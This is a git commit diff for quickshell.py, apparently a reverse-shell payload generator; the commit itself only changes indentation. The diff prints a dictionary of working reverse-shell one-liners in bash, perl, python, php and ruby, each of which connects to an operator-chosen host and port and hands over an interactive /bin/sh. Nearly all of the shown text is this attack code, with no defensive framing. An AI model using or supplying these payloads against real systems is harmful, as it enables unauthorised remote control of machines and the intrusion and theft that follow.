7dfafced9f4a2c632db670071e0e58df35fc3819
Shazeb <shaz3b01@protonmail.com>
2021-05-15 08:34:09 +0530

    Update quickshell.py

--- quickshell.py
+++ quickshell.py
@@ -10,8 +10,8 @@ parser.add_argument("-s","--silent",help="no Banner.")
 args = parser.parse_args()
 
 payloads = {
-    "bash":   "bash -i >& /dev/tcp/{0}/{1} 0>&1",
-    "perl":   """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};""",
+    	"bash":   "bash -i >& /dev/tcp/{0}/{1} 0>&1",
+    	"perl":   """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};""",
 	"python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
 	"php":    """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'""",
 	"ruby":   """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
